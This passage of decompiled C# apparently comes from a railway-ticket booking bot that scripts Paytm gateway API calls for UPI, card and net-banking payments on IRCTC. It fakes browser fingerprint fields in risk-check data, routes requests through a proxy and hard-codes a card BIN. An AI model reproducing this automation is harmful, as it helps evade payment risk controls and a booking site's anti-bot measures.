                            text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text21 + "}";
                            text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":{\"payMethods\":[{\"payMethod\":\"UPI\",\"instId\":null}],\"txnAmount\":\"" + string4 + "\",\"useAmount\":false,\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":true}";
                            bool_29 = true;
                            bool_29 = true;
                            _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                            string text22 = "totalTransactionAmount\":{\"currency\":\"INR\",\"value\":\"";
                            int length = text22.Length;
                            text22 = string_99.Substring(string_99.IndexOf(text22) + length);
                            string text23 = text22.Substring(0, text22.IndexOf("\""));
                            while (true)
                            {
                                text16 = method_14();
                                string_93 = text13 + "api/v1/vpa/validate?mid=" + @string + "&orderId=" + string2;
                                text21 = "{\"vpa\":\"" + text3 + "\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"}";
                                text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text21 + "}";
                                string string_100 = string_93;
                                string string_101 = text9;
                                bool_29 = true;
                                _Request(string_100, string_101, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                                text16 = method_14();
                                string_93 = text13 + "api/v1/processTransaction?mid=" + @string + "&orderId=" + string2;
                                text21 = string.Concat("{\"paymentMode\":\"UPI\",\"payerAccount\":\"", text3, "\",\"requestType\":\"NATIVE\",\"authMode\":\"3D\",\"mid\":\"", @string, "\",\"orderId\":\"", string2, "\",\"riskExtendInfo\":\"userAgent:Mozilla\"/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\"/537.36 (KHTML, like Gecko) Chrome\"/90.0.4430.85 Safari\"/537.36|timeZone:Asia\"/Calcutta|operationType:PAYMENT|businessFlow:STANDARD|amount:" + text23 + "|merchantType:offus|language:en-US|screenResolution:1536X864|osType:Windows|osVersion:10|platform:WEB|channelId:WEB|deviceType:Desktop|browserType:Chrome|browserVersion:68.0.3440.106|\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":2},\"showPostFetchLoader\":false");
                                text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text21 + "}";
                                text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":{\"paymentMode\":\"UPI\",\"payerAccount\":\"" + text3 + "\",\"showPostFetchLoader\":false,\"requestType\":\"NATIVE\",\"authMode\":\"3D\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"riskExtendInfo\":\"userAgent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36|timeZone:Asia/Calcutta|operationType:PAYMENT|refererURL:https://www.irctc.co.in/|businessFlow:STANDARD|amount:" + text23 + "|merchantType:offus|language:en-US|screenResolution:1920X1080|networkType:4g|osType:Windows|osVersion:10|platform:WEB|channelId:WEB|deviceType:Desktop|browserType:Chrome|browserVersion:106.0.0.0|\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":2},\"showPostFetchLoader\":false}";
                                bool_29 = true;
                                _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                                string string5 = GetString(string_99, "TXN_AMOUNT");
                                string string6 = GetString(string_99, "transId");
                                string string7 = GetString(string_99, "cashierRequestId");
                                string string8 = GetString(string_99, "MERCHANT_VPA");
                                string_93 = string.Concat(new string[4] { "https://securegw.paytm.in/theia/upi/transactionStatus?MID=", @string, "&ORDER_ID=", string2 });
                                text9 = "merchantId=" + @string + "&ORDER_ID=" + string2 + "&transId=" + string6 + "&cashierRequestId=" + string7 + "&paymentMode=UPI";
                                updateTStatus_1.BeginInvoke(1, "Init. PAYTM Websafe-2/3", tCntrlName_, null, null);
                                DateTime dateTime = DateTime.Now.AddSeconds(20.0);
                                if (string_87.Contains("@axisbank"))
                                {
                                    while (true)
                                    {
                                        if (DateTime.Now > dateTime)
                                        {
                                            updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                                            frmUPI.payStart = true;
                                            break;
                                        }
                                        if (frmUPI.payStart)
                                        {
                                            Application.DoEvents();
                                            Thread.Sleep(100);
                                            continue;
                                        }
                                        updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                                        frmUPI.payStart = true;
                                        break;
                                    }
                                }
                                else
                                {
                                    updateTStatus_1.BeginInvoke(1, "Accept UPI Request..", tCntrlName_, null, null);
                                }
                                DateTime dateTime2 = DateTime.Now.AddSeconds(92.0);
                                do
                                {
                                    Thread.Sleep(500);
                                    if (DateTime.Now > dateTime2)
                                    {
                                        break;
                                    }
                                    _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_98, ref string_98, ref webException_0);
                                }
                                while (string_98.Contains("POLL_AGAIN"));
                                while (!(string_98.Contains("insufficient Balance") | string_98.Contains("Payment inComplete")))
                                {
                                    if (!string_98.Contains("POLL_AGAIN"))
                                    {
                                        updateTStatus_1.BeginInvoke(1, "Init. PAYTM Websafe-2/3", tCntrlName_, null, null);
                                        string_93 = text13 + "transactionStatus?mid=" + @string + "&ORDER_ID=" + string2;
                                        text9 = text9 + "&vpaID=" + HttpUtility.UrlEncode(text3) + "&isSelfPush=false&upiAccepted=true&upiStatusUrl=" + HttpUtility.UrlEncode(string_93) + "&upiHandleInfo=%5Bobject+Object%5D&selfPush=false&TXN_AMOUNT=" + string5 + "&STATUS_INTERVAL=5000&STATUS_TIMEOUT=300000&MERCHANT_VPA=" + string8;
                                        if (_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                                        {
                                            clsMain.Lock("Success ProcessPAYTM_Getways_BHIMUPI");
                                            if (string_99.IndexOf("ENC_DATA") <= 0 && string_99.IndexOf("CHECKSUMHASH") <= 0)
                                            {
                                                string_98 = "Payment inComplete Select anOther Gateway";
                                                continue;
                                            }
                                            string_90 = string_99;
                                            string_91 = string_92;
                                            return true;
                                        }
                                        clsMain.Lock("First Hit Failed. err = " + string_98);
                                        string_91 = "Paytm Gateway not working - Payment Failed";
                                        return false;
                                    }
                                    clsMain.Lock("Upi Payment Cancel" + response);
                                    return false;
                                }
                                string text24;
                                do
                                {
                                    ((ComboBox)clsMain.control_1.Controls["cboGateway"]).Enabled = true;
                                    clsMain.Lock("Bank ID Not Exists, Choice for another payment");
                                    updateTStatus_1.BeginInvoke(1, string_98, clsMain.tCntrlName_, null, null);
                                    frmPayment frmPayment = new frmPayment();
                                    frmPayment.string_1 = string_98;
                                    frmPayment.btnSubmit.Text = "Resume";
                                    frmPayment.bool_0 = true;
                                    frmPayment.method_1(clsMain.control_0, clsMain.rectangle_0, class3_0, class3_0.BANKSAVEAS);
                                    if (frmPayment.DialogResult == DialogResult.OK)
                                    {
                                        text24 = ((ComboBox)clsMain.control_1.Controls["cboGateway"]).SelectedItem.ToString();
                                        continue;
                                    }
                                    bool_52 = true;
                                    return false;
                                }
                                while (!text24.Contains("@"));
                                ((ComboBox)clsMain.control_1.Controls["cboGateway"]).Enabled = false;
                                text3 = class3_0.dictionary_BnkData[text24];
                                array = text3.Split(new string[1] { "||" }, StringSplitOptions.None);
                                text3 = array[0];
                            }
                        }
                        string_93 = text13 + "api/v1/fetchPcfDetails?mid=" + @string + "&orderId=" + string2;
                        string_93 = text13 + "api/v1/fetchNBPaymentChannels?mid=" + @string + "&orderId=" + string2;
                        string text25 = "{\"payMethods\":[{\"payMethod\":\"NET_BANKING\",\"instId\":\"" + text + "\"}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text25 + "}";
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":{\"type\":\"MERCHANT\",\"mid\":\"IRCTCw862137775\",\"orderId\":\"" + string2 + "\"}}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        string_93 = text13 + "api/v1/processTransaction?mid=" + @string + "&orderId=" + string2;
                        text25 = "{\"paymentMode\":\"NET_BANKING\",\"channelCode\":\"" + text + "\",\"requestType\":\"NATIVE\",\"authMode\":\"3D\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":3}";
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text25 + "}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        if (!string_99.Contains("redirectForm"))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        sbijson = string_99;
                        string text26 = string_99.Substring(string_99.IndexOf("redirectForm") + 10);
                        string text27 = text26.Substring(text26.IndexOf("actionUrl") + 12);
                        text27 = text27.Substring(0, text27.IndexOf("\","));
                        string text28 = text26.Substring(text26.IndexOf("content") + 10);
                        text28 = text28.Substring(0, text28.IndexOf("}"));
                        text28 = text28.Replace("\":", "#").Replace(",", "&").Replace("\"", "");
                        response = method_168(text27, text28);
                        bool_13 = true;
                        string text29 = string_99.Substring(string_99.IndexOf("content\":{") + 10);
                        text29 = text29.Substring(0, text29.IndexOf("}"));
                        text29 = text29.Replace("\":\"", "=").Replace("\"", "");
                        string[] array2 = text29.Split(new string[1] { "," }, StringSplitOptions.None);
                        string text30 = "";
                        for (int j = 0; j < array2.Length; j++)
                        {
                            string text31 = array2[j];
                            if (text31.Contains("https") || text31.Contains("Date"))
                            {
                                string[] array3 = text31.Split(new string[1] { "=" }, StringSplitOptions.None);
                                text31 = array3[0] + "=" + WebUtility.UrlEncode(array3[1]);
                            }
                            text30 = ((j != 0) ? (text30 + "&" + text31) : text31);
                        }
                        string string9 = GetString(string_99, "callbackUrl");
                        string_99 = text30 + "|" + string9;
                    }
                    clsMain.Lock("Third Hit Inp = " + text9);
                    bool flag2 = false;
                    try
                    {
                        if (string_99.Contains("ipg-online.com"))
                        {
                            method_145(ref string_99, string_93, cookieContainer_, string_94, ref string_91);
                        }
                        switch (text6)
                        {
                            case "52":
                                flag2 = method_117(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "1":
                                {
                                    CookieContainer cookieContainer_2 = null;
                                    flag2 = SbiNetBanking_Paytm(sbijson, class3_0.BANKSAVEAS, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2, ref cookieContainer_2);
                                    break;
                                }
                            case "36":
                                flag2 = HdfcPAYTM(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "56":
                                flag2 = method_138(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "41":
                                flag2 = method_107(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                            case "45":
                                flag2 = method_120(string_99, class3_0.BANKDETAILS, string_89, ref string_90, ref string_91, updateTStatus_2);
                                break;
                        }
                    }
                    catch
                    {
                    }
                    if (!flag2)
                    {
                        return false;
                    }
                    string_99 = string_90;
                    if (string_90.Contains("ipg-online.com"))
                    {
                        method_145(ref string_90, string_93, cookieContainer_, string_94, ref string_91);
                    }
                    if (string_90.Contains(value))
                    {
                        string_92 = string_91;
                        text9 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                        if (string_93.IndexOf("https://secure.paytm.in/") != 0)
                        {
                            string_93 = "https://secure.paytm.in/oltp/HANDLER_WEB_RESP/" + text + text2 + "/USRPWD";
                        }
                        clsMain.Lock("Third Hit Inp = " + text9);
                        if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_98);
                            string_91 = "Gateway Not Working - Payment Failed";
                            return false;
                        }
                    }
                    if (string_90.Contains(value2))
                    {
                        string_92 = string_91;
                        text9 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                        if (string_93.IndexOf("https://securegw.paytm.in/") != 0)
                        {
                            string_93 = "https://securegw.paytm.in/instaproxy/bankresponse/" + text + "/" + text2 + "/RESP";
                        }
                        clsMain.Lock("Third Hit Inp = " + text9);
                        if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                        {
                            clsMain.Lock("Third Hit Failed. err = " + string_98);
                            string_91 = "Gateway Not Working - Payment Failed";
                            return false;
                        }
                        string_90 = string_99;
                        if (string_90.Contains("https://securegw.paytm.in"))
                        {
                            text9 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                            clsMain.Lock("Third Hit Inp = " + text9);
                            if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                            {
                                clsMain.Lock("Third Hit Failed. err = " + string_98);
                                string_91 = "Gateway Not Working - Payment Failed";
                                return false;
                            }
                        }
                        string_90 = string_99;
                    }
                    clsMain.Lock("Third Output htm = " + string_99);
                    
                    if (!string_99.Contains("https://www.irctc.co.in/eticketing/mbi"))
                    {
                        string_91 = "Error Occured while Making Payment!";
                        clsMain.Lock(string_91 + ", Check HTML");
                        return false;
                    }
                    clsMain.Lock("Success ProcessCC_PTM");
                    string_90 = string_99;
                    string_91 = string_92;
                    return true;
                }
                catch (Exception ex)
                {
                    frmUPI.payStart = false;
                    clsMain.method_74("ProcessCC_PTM", ex.Message);
                    return false;
                }
            }
            return method_146(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
        }

        internal bool PayTM_ICICI(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            clsMain.Lock("Enter ProcessCC_PTM.  DETAILS: ");
            if (!string_86.Contains("paytm") & !string_86.Contains("Paytm"))
            {
                string_91 = "Some thing went wrong with Credit Card Payment";
                clsMain.Lock("Html doesn't contains paytm, returning.");
                return false;
            }
            string text = string_88;
            string text2 = "";
            string string_92 = class3_0.string_69;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text3 = "";
            string text4 = "";
            string text5 = "";
            try
            {
                text3 = array[0].Trim();
                text4 = array[1];
                if (array.Length > 2)
                {
                    text5 = array[2];
                }
            }
            catch
            {
            }
            string string_93 = "";
            string text6 = "";
            string string_94 = "";
            string text7 = "";
            if (!string_88.Contains("_DC") && !string_88.Contains("_CC"))
            {
                if (string_88.Contains("BHIMUPI") || string_88.Contains("PHONEPE") || string_88.Contains("PAYUUPI"))
                {
                    text2 = "UPI";
                }
                else
                {
                    bool flag = array.Length > 4;
                    text2 = "NB";
                    string text8 = text;
                    switch (Class46.smethod_0(text8))
                    {
                        case 1145574292u:
                            if (text8 == "UNION")
                            {
                                text = "UNI";
                                text6 = "28";
                            }
                            break;
                        case 1005593931u:
                            if (text8 == "SBI")
                            {
                                text = "SBI";
                                text6 = "1";
                            }
                            break;
                        case 2970694650u:
                            if (text8 == "HDFC")
                            {
                                return method_146(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
                            }
                            break;
                        case 1934763940u:
                            if (text8 == "ICICI")
                            {
                                text6 = "44";
                            }
                            break;
                        case 3504019421u:
                            if (text8 == "IDBI")
                            {
                                text6 = "52";
                            }
                            break;
                        case 3298409214u:
                            if (!(text8 == "PAYTM"))
                            {
                                break;
                            }
                            if (clsMain.isAPP)
                            {
                                return Multi_PaytmPayApp(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
                            }
                            return method_146(string_86, string_87, string_88, string_89, ref string_90, ref string_91, updateTStatus_2);
                        case 4249340199u:
                            if (text8 == "INDUSIND")
                            {
                                text = "INDS";
                                text6 = "45";
                            }
                            break;
                        case 4021309901u:
                            if (text8 == "CORP")
                            {
                                text6 = "56";
                            }
                            else if (text8 == "AIRTELMONEY")
                            {
                                text6 = "56";
                            }
                            break;
                    }
                }
                string text9 = "";
                string value = "secure.paytm.in";
                string value2 = "securegw.paytm.in";
                text9 = class3_0.Method_SerialInp(string_86, ref string_93, true);
                if (!clsMain.isAPP)
                {
                    string text10 = string_86.Substring(string_86.IndexOf("name=\"ENC_DATA\" value=\"") + 23);
                    text10 = text10.Substring(0, text10.IndexOf("\""));
                    if (text10.Contains("\n"))
                    {
                        text10 = WebUtility.UrlEncode(text10);
                        string text11 = string_86.Substring(string_86.IndexOf("name=\"MID\" value=") + 18);
                        text11 = text11.Substring(0, text11.IndexOf("\""));
                        string text12 = string_86.Substring(string_86.IndexOf("name=\"CHECKSUMHASH\" value=") + 27);
                        text12 = text12.Substring(0, text12.IndexOf("\""));
                        text12 = WebUtility.UrlEncode(text12);
                        text9 = "MID=" + text11 + "&ENC_DATA=" + text10 + "&CHECKSUMHASH=" + text12;
                    }
                }
                if (string_86.Contains("ENC_DATA") && clsMain.isAPP)
                {
                    string string_95 = GetString_(string_86, "ENC_DATA\",\"value", "\"");
                    string_95 = HttpUtility.UrlEncode(string_95);
                    string_95 = string_95.Replace("%5cn", "%0A");
                    string string_96 = GetString_(string_86, "CHECKSUMHASH\",\"value", "\"");
                    string_96 = HttpUtility.UrlEncode(string_96);
                    string string_97 = GetString_(string_86, "MID\",\"value", "\"");
                    string_93 = GetString_(string_86, "bankUrl\",\"value", "\"");
                    text9 = "MID=" + string_97 + "&CHECKSUMHASH=" + string_96 + "&ENC_DATA=" + string_95;
                }
                string text13 = string_93.Substring(0, string_93.IndexOf(".in/") + 3);
                Uri uri = new Uri(string_93);
                text13 = "https://" + uri.Host;
                for (int i = 0; i < uri.Segments.Length - 1; i++)
                {
                    text13 += uri.Segments[i];
                }
                string text14 = ((!string_93.Contains("oltp-web")) ? string_93.Substring(0, string_93.IndexOf(".in/") + 3) : "https://secure.paytm.in/oltp-web/");
                CookieContainer cookieContainer_ = new CookieContainer();
                string string_98 = "";
                string string_99 = "";
                try
                {
                    Lock("First Hit Inp = " + text9);
                    if (!clsMain.isAPP)
                    {
                        text9 = method_162(text9);
                    }
                    if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_98);
                        string_91 = "Paytm Gateway not working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_99);
                    updateTStatus_1.BeginInvoke(1, "Init. PAYTM Websafe-1/3", tCntrlName_, null, null);
                    string_92 = string_93;
                    text13 = "https://securegw.paytm.in/theia/";
                    if (string.IsNullOrEmpty(string_99.Trim()) || !string_99.Contains("Paytm Secure"))
                    {
                        return result;
                    }
                    string text15 = string_99.Substring(string_99.IndexOf("var pushAppData=") + 17);
                    text15 = text15.Substring(0, text15.IndexOf("\""));
                    text15 = Class12.smethod_26(text15);
                    string @string = GetString(text15, "mid");
                    @string = GetString(text15, "mid");
                    string string2 = GetString(text15, "insufficientBalance\":true,\"id");
                    string text16 = method_14();
                    string string3 = GetString(string_99, "txnToken");
                    string string4 = GetString(text15, "txnAmount");
                    string3 = GetString(text15, "txnToken");
                    if (string_88.Contains("_DC") || string_88.Contains("_CC"))
                    {
                        string_93 = text13 + "api/v1/fetchPcfDetails?mid=" + @string + "&orderId=" + string2;
                        text16 = method_14();
                        string text17 = "{\"payMethods\":[{\"payMethod\":\"DEBIT_CARD\",\"instId\":null}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
                        if (string_88.Contains("_CC"))
                        {
                            text17 = "{\"payMethods\":[{\"payMethod\":\"CREDIT_CARD\",\"instId\":null}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
                        }
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text17 + "}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        string_93 = text13 + "api/v1/fetchBinDetail?mid=" + @string + "&orderId=" + string2;
                        text16 = method_14();
                        text17 = "{\"bin\":\"526099\",\"txnType\":\"NONE\",\"isEMIDetails\":false,\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"}";
                        if (string_88.Contains("_CC"))
                        {
                            text17 = "{\"bin\":\"526099\",\"txnType\":\"NONE\",\"isEMIDetails\":false,\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"}";
                        }
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text17 + "}";
                        bool_29 = true;
                        _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                        string_93 = text13 + "api/v1/processTransaction?mid=" + @string + "&orderId=" + string2;
                        text16 = method_14();
                        string text18 = "1";
                        text17 = "{\"paymentMode\":\"DEBIT_CARD\",\"authMode\":\"otp\",\"cardInfo\":\"|" + text3 + "|" + text7 + "|" + text4 + text5 + "\",\"storeInstrument\":\"1\",\"requestType\":\"NATIVE\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":" + text18 + "}";
                        if (string_88.Contains("_CC"))
                        {
                            text18 = "1";
                            text17 = "{\"paymentMode\":\"CREDIT_CARD\",\"authMode\":\"otp\",\"cardInfo\":\"|" + text3 + "|" + text7 + "|" + text4 + text5 + "\",\"storeInstrument\":\"1\",\"requestType\":\"NATIVE\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":" + text18 + "}";
                        }
                        text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text17 + "}";
                        bool_29 = true;
                        if (!_Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_99, ref string_98, ref webException_0))
                        {
                            clsMain.Lock("First Hit Failed. err = " + string_98);
                            string_91 = "Paytm Gateway not working - Payment Failed";
                            return false;
                        }
                        if (string_99.Contains("resultStatus\":\"S"))
                        {
                            string text19 = string_99.Substring(string_99.IndexOf("callbackUrl") + 14);
                            text19 = text19.Substring(0, text19.IndexOf("\""));
                            string text20 = string_99.Substring(string_99.IndexOf("content") + 10);
                            text20 = text20.Substring(0, text20.IndexOf("\"}"));
                            text20 = text20.Replace("\":", "#").Replace(",", "&");
                            text20 = text20.Replace("\\\"", "").Replace("\\", "").Replace("\"", "");
                            string_99 = method_168(text19, text20);
                        }
                    }
                    else
                    {
                        if (string_88.Contains("BHIMUPI") || string_88.Contains("PHONEPE") || string_88.Contains("PAYUUPI"))
                        {
                            string_93 = text13 + "api/v1/fetchPcfDetails?mid=" + @string + "&orderId=" + string2;
                            string text21 = "{\"payMethods\":[{\"payMethod\":\"UPI\",\"instId\":null}],\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":false";
                            text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text21 + "}";
                            text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":{\"payMethods\":[{\"payMethod\":\"UPI\",\"instId\":null}],\"txnAmount\":\"" + string4 + "\",\"useAmount\":false,\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"},\"showLoader\":true}";
                            bool_29 = true;
                            bool_29 = true;
                            _Request(string_93, text9, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                            string text22 = "totalTransactionAmount\":{\"currency\":\"INR\",\"value\":\"";
                            int length = text22.Length;
                            text22 = string_99.Substring(string_99.IndexOf(text22) + length);
                            string text23 = text22.Substring(0, text22.IndexOf("\""));
                            while (true)
                            {
                                text16 = method_14();
                                string_93 = text13 + "api/v1/vpa/validate?mid=" + @string + "&orderId=" + string2;
                                text21 = "{\"vpa\":\"" + text3 + "\",\"mid\":\"" + @string + "\",\"orderId\":\"" + string2 + "\"}";
                                text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text21 + "}";
                                string string_100 = string_93;
                                string string_101 = text9;
                                bool_29 = true;
                                _Request(string_100, string_101, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_99, ref string_98, ref webException_0);
                                text16 = method_14();
                                string_93 = text13 + "api/v1/processTransaction?mid=" + @string + "&orderId=" + string2;
                                text21 = string.Concat("{\"paymentMode\":\"UPI\",\"payerAccount\":\"", text3, "\",\"requestType\":\"NATIVE\",\"authMode\":\"3D\",\"mid\":\"", @string, "\",\"orderId\":\"", string2, "\",\"riskExtendInfo\":\"userAgent:Mozilla\"/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\"/537.36 (KHTML, like Gecko) Chrome\"/90.0.4430.85 Safari\"/537.36|timeZone:Asia\"/Calcutta|operationType:PAYMENT|businessFlow:STANDARD|amount:" + text23 + "|merchantType:offus|language:en-US|screenResolution:1536X864|osType:Windows|osVersion:10|platform:WEB|channelId:WEB|deviceType:Desktop|browserType:Chrome|browserVersion:68.0.3440.106|\",\"paymentFlow\":\"NONE\",\"selectedPaymentModeId\":2},\"showPostFetchLoader\":false");
                                text9 = "{\"head\":{\"version\":\"v1\",\"requestTimestamp\":" + text16 + ",\"channelId\":\"WEB\",\"txnToken\":\"" + string3 + "\",\"workFlow\":\"enhancedCashierFlow\",\"token\":\"" + string3 + "\",\"tokenType\":\"TXN_TOKEN\"},\"body\":" + text21 + "}";
